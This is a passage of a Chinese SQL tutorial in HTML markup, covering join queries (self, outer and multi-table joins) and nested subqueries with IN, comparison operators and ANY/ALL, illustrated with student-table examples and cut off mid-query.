&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;WHERE 表名1.列名1 比较运算符 表名2.列名2&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;当列名在参与连接的各表中唯一时，可省去表名前缀&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;eg.查询TAB1和TAB2中所有数据，并在一个查询结果里面展示&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;.&lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB2&lt;/span&gt;.&lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Nu&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;TAB2&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Nu&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;若想获得自然连接，则列举全部属性列，并去掉一个相同的属性列即可。可以将上述SELECT语句改写如下：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Ch&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;Cla&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;Hom&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB2&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Nu&lt;/span&gt;  &lt;span style=&#34;color:#7f848e&#34;&gt;-- 去掉了其中一个Nu
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Nu&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;TAB2&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Nu&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;eg.在TAB1和TAB2里查询选了英语课，并且是三年级的学生的学号:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Nu&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;tab2&amp;#34;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;CLA&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;ENGLISH&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;AND&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;GRADE&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;3&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;单表连接查询&#34;&gt;单表连接查询
&lt;/h4&gt;&lt;p&gt;&lt;span style=&#34;color:red;font-size:15px&#34;&gt;&lt;strong&gt;通过取两个别名，对同一个表进行自连接&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;eg.查询cla和cla2相同的学生学号：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;FIRST&lt;/span&gt;.&lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;,&lt;span style=&#34;color:#c678dd&#34;&gt;SECOND&lt;/span&gt;.&lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB2&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;FIRST&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;tab2&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;SECOND&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;FIRST&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;CLA&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SECOND&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;CLA2&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;外连接查询&#34;&gt;外连接查询
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;左外连接保留左表的所有记录，并尽可能地匹配右表中的记录&lt;/strong&gt;
&lt;strong&gt;右外连接保留右表的所有记录，并尽可能地匹配左表中的记录&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:red;font-size:15px&#34;&gt;&lt;strong&gt;将悬浮元组保留在结果关系中，没有属性值的位置填上NULL&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;mark&gt;SELECT 列名 FROM 表名1 LEFT OUTER JOIN 表名2 ON(连接条件)&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;mark&gt;SELECT 列名 FROM 表名1 RIGHT OUTER JOIN 表名2 ON(连接条件)&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;eg.以TAB1为主体，列出每个学生选课cla的结果&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Ch&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;CLA&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;LEFT&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;OUTER&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;JOIN&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB2&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;ON&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Nu&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB2&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Nu&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;此时会保留TAB1里面的所有记录，匹配对应的TAB2记录&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;多表连接查询&#34;&gt;多表连接查询
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;WHERE 表名1.列名1 = 表名2.列名2 AND 表名2.列名2 = 表名3.列名3&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;多表连接一般是先进行两个表的连接操作，再将其连接结果与第三个表执行连接&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;嵌套查询&#34;&gt;嵌套查询
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;&lt;span style=&#34;color:orange&#34;&gt;查询块&lt;/span&gt;：SELECT-FROM-WHERE&lt;/strong&gt;
&lt;strong&gt;&lt;span style=&#34;color:orange&#34;&gt;嵌套查询&lt;/span&gt;：将一个查询块嵌套在另一个查询块的WHERE子句或者HAVING子句&lt;/strong&gt;
&lt;strong&gt;上层的查询块称为外层查询/父查询；下层的查询块称为内层查询/子查询&lt;/strong&gt;
&lt;span style=&#34;color:red;font-size:18px&#34;&gt;&lt;strong&gt;子查询的SELECT语句中不能使用ORDERBY子句，ORDERBY子句只能对最终查询结果排序&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h4 id=&#34;集合判断in子查询&#34;&gt;集合判断IN子查询
&lt;/h4&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;WHERE 列名 IN (子查询)&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;eg.查询alice的年级：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;GRADE&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;CH&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;alice&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;查询结果为alice在三年级，再查找三年级的其他学生：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;CH&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;NU&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;GRADE&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;3&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上面两个查询结合为嵌套查询：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;CH&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;NU&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;GRADE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;IN&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	(&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;GRADE&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;CH&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;alice&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    );
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;本例的子查询条件不依赖于父查询，这类子查询称为不相关子查询&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;比较运算符子查询&#34;&gt;比较运算符子查询
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;WHERE 列名 比较运算符 (子查询)&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;当明确知道子查询结果是单个值而不是集合的时候使用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;eg．在SC表中，找出每个学生（Sno）超过他自己选修课程平均成绩（Grade）的课程号（Cno)&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Sno&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;Cno&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;SC&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;x&lt;/span&gt;    &lt;span style=&#34;color:#7f848e&#34;&gt;-- x是表 SC 的别名，又称为元组变量，可以用来表示 SC 的一个元组
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;gt;=&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	(&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;AVG&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;SC&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;y&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;y&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Sno&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;x&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Sno&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;这里必须加上WHERE y.Sno=x.Sno这个条件，此时内外对应的sno才会相同，否则求的不是单个学生的平均成绩，而是所有学生的平均成绩&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;本例的子查询条件依赖于父查询，这类子查询称为相关子查询，整个查询称为相关嵌套查询&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;anyall子查询&#34;&gt;ANY/ALL子查询
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;WHERE 列名 比较运算符 ANY/ALL (子查询)&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;谓词&lt;/th&gt;
          &lt;th&gt;语义&lt;/th&gt;
          &lt;th&gt;与聚集函数或 IN 的等价转换&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&amp;gt;ANY&lt;/td&gt;
          &lt;td&gt;大于子查询结果中的某个值&lt;/td&gt;
          &lt;td&gt;&amp;gt;MIN&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&amp;gt;ALL&lt;/td&gt;
          &lt;td&gt;大于子查询结果中的所有值&lt;/td&gt;
          &lt;td&gt;&amp;gt;MAX&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&amp;lt;ANY&lt;/td&gt;
          &lt;td&gt;小于子查询结果中的某个值&lt;/td&gt;
          &lt;td&gt;&amp;lt;MAX&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&amp;lt;ALL&lt;/td&gt;
          &lt;td&gt;小于子查询结果中的所有值&lt;/td&gt;
          &lt;td&gt;&amp;lt;MIN&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&amp;gt;=ANY&lt;/td&gt;
          &lt;td&gt;大于等于子查询结果中的某个值&lt;/td&gt;
          &lt;td&gt;&amp;gt;=MIN&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&amp;gt;=ALL&lt;/td&gt;
          &lt;td&gt;大于等于子查询结果中的所有值&lt;/td&gt;
          &lt;td&gt;&amp;gt;=MAX&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&amp;lt;=ANY&lt;/td&gt;
          &lt;td&gt;小于等于子查询结果中的某个值&lt;/td&gt;
          &lt;td&gt;&amp;lt;=MAX&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&amp;lt;=ALL&lt;/td&gt;
          &lt;td&gt;小于等于子查询结果中的所有值&lt;/td&gt;
          &lt;td&gt;&amp;lt;=MIN&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;=ANY&lt;/td&gt;
          &lt;td&gt;等于子查询结果中的某个值&lt;/td&gt;
          &lt;td&gt;IN&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;=ALL&lt;/td&gt;
          &lt;td&gt;等于子查询结果中的所有值（通常无实际意义）&lt;/td&gt;
          &lt;td&gt;&amp;ndash;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;!=(或&amp;lt;&amp;gt;)ANY&lt;/td&gt;
          &lt;td&gt;不等于子查询结果中的某个值&lt;/td&gt;
          &lt;td&gt;&amp;ndash;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;!=(或&amp;lt;&amp;gt;)ALL&lt;/td&gt;
          &lt;td&gt;不等于子查询结果中的任何值&lt;/td&gt;
          &lt;td&gt;NOT IN&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;eg.查询TAB1里面三年级学生学号大于23000的：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Ch&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Nu&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;gt;=&lt;/span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;ANY&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	(&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Nu&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	 &lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;tab1&amp;#34;&lt;/span&gt; 
